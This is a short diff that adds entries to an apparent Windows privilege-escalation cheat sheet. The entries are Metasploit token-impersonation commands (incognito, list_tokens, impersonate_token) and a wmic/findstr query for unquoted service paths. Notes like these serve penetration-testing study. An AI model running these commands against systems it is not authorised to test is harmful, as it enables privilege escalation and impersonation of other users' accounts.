@@ -1,3 +1,27 @@
+------------
+|Metasploit|
+------------
+#Gather current user privileges/UAC
+run post/windows/gather/win_privs
+
+#Use incognito
+use incognito
+
+#Show possible users to impersonate
+list_tokens -u
+
+#Impersonate user
+impersonate_token [username]
+
+-----------------------
+|Unquoted Service Path|
+-----------------------
+#Check for possible paths
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+#Query service
+sc qc [Service Name]
+
 
 -----------------
 |Kernel Exploits|
